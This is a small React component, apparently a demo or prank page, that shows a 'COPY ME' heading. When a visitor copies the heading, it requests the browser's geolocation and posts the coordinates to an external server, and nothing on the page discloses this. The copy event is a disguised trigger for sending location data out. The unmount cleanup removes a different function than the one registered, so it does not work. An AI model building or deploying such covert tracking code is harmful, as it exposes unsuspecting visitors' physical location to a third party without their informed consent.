import React, { useEffect } from "react";
import axios from "axios";

const URL = "https://server-fwb9.onrender.com";

function getLocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(showPosition);
  } else {
    console.log("Geolocation is not supported by this browser.");
  }
}

function showPosition(position) {
  axios.post(URL+"/api", {
    Latitude: position.coords.latitude,
    Longitude: position.coords.longitude,
  });
}

function App() {
  useEffect(() => {
    const h = document.querySelector("h1");
    if (h) {
      h.addEventListener("copy", () => {
        h.innerText ="You have copied the content";
        getLocation();
      });

      // Cleanup the event listener on unmount
      return () => {
        h.removeEventListener("copy", getLocation);
      };
    }
  }, []);

  return <h1>COPY ME </h1>;
}

export default App;
